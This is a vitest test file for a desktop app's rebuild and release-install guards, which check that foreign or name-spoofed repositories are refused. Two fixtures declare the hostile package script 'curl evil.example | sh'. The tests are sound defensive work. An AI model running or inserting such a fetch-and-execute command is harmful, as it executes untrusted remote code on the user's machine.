import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, describe, expect, it } from 'vitest'
import { installLatestRelease, isCockpitSource } from '../electron/main/services/localRebuild'

const roots: string[] = []

function makeProject(pkg: unknown | null): string {
  const dir = mkdtempSync(join(tmpdir(), 'cockpit-rebuild-test-'))
  roots.push(dir)
  if (pkg !== null) {
    writeFileSync(join(dir, 'package.json'), JSON.stringify(pkg, null, 2))
  }
  return dir
}

afterAll(() => {
  for (const dir of roots) rmSync(dir, { recursive: true, force: true })
})

describe('isCockpitSource (rebuild target identity)', () => {
  const cockpitPkg = {
    name: 'cockpit',
    build: { appId: 'com.boyraz.cockpit' },
    scripts: { 'app:refresh': 'bash scripts/release/refresh-local-app.sh' },
  }

  it('accepts a real cockpiT source checkout', () => {
    expect(isCockpitSource(makeProject(cockpitPkg))).toBe(true)
  })

  it('refuses a foreign repo even when it declares an app:refresh script', () => {
    const hostile = makeProject({
      name: 'totally-not-cockpit',
      scripts: { 'app:refresh': 'curl evil.example | sh' },
    })
    expect(isCockpitSource(hostile)).toBe(false)
  })

  it('refuses a name-spoofed repo with the wrong appId', () => {
    const spoofed = makeProject({
      ...cockpitPkg,
      build: { appId: 'com.attacker.app' },
    })
    expect(isCockpitSource(spoofed)).toBe(false)
  })

  it('refuses the real identity without the refresh script', () => {
    const noScript = makeProject({ ...cockpitPkg, scripts: {} })
    expect(isCockpitSource(noScript)).toBe(false)
  })

  it('refuses a directory with no or unreadable package.json', () => {
    expect(isCockpitSource(makeProject(null))).toBe(false)
    const broken = makeProject(null)
    writeFileSync(join(broken, 'package.json'), '{not json')
    expect(isCockpitSource(broken)).toBe(false)
  })
})

// Only the refusal paths are testable — a passing guard would spawn a real
// `npm run app:install-release` and replace the installed app.
describe('installLatestRelease (release rebaseline guard)', () => {
  const cockpitPkg = {
    name: 'cockpit',
    build: { appId: 'com.boyraz.cockpit' },
    scripts: {
      'app:refresh': 'bash scripts/release/refresh-local-app.sh',
      'app:install-release': 'bash scripts/release/install-release.sh',
    },
  }

  it('refuses a foreign repo even when it declares an app:install-release script', () => {
    const hostile = makeProject({
      name: 'totally-not-cockpit',
      scripts: { 'app:install-release': 'curl evil.example | sh' },
    })
    const res = installLatestRelease(hostile)
    expect(res.ok).toBe(false)
    expect(res.message).toMatch(/not the cockpiT source/i)
  })

  it('refuses the real identity when the install-release script is missing', () => {
    const noScript = makeProject({
      ...cockpitPkg,
      scripts: { 'app:refresh': 'bash scripts/release/refresh-local-app.sh' },
    })
    const res = installLatestRelease(noScript)
    expect(res.ok).toBe(false)
    expect(res.message).toMatch(/app:install-release/)
  })

  it('refuses a directory with no package.json', () => {
    expect(installLatestRelease(makeProject(null)).ok).toBe(false)
  })
})
